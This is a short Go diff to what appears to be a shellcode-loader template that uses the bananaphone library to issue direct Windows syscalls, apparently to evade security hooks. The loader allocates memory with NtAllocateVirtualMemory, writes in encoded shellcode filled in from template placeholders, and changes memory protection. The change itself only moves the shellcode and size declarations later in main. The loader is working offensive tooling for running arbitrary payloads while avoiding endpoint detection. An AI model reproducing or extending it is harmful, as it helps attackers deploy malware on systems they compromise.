@@ -39,9 +39,6 @@ func encodeByteArray(s string) (res []byte) {
 }
 
 func main() {
-	sc := encodeByteArray("{{ .ShellcodeEncoded }}")
-	n := {{ .Size }}
-
 	bp, err := bananaphone.NewBananaPhone(bananaphone.AutoBananaPhoneMode)
 	if err != nil {
 		panic(err)
@@ -61,6 +58,7 @@ func main() {
 
 	handle := uintptr(0xffffffffffffffff)
 	var baseA uintptr
+	n := {{ .Size }}
 	regionsize := uintptr(n)
 	r1, r := bananaphone.Syscall(
 		alloc, //ntallocatevirtualmemory
@@ -74,7 +72,9 @@ func main() {
 	if r != nil {
 		panic(r)
 	}
+
 	//write memory
+	sc := encodeByteArray("{{ .ShellcodeEncoded }}")
 	bananaphone.WriteMemory(sc, baseA)
 
 	var oldprotect uintptr
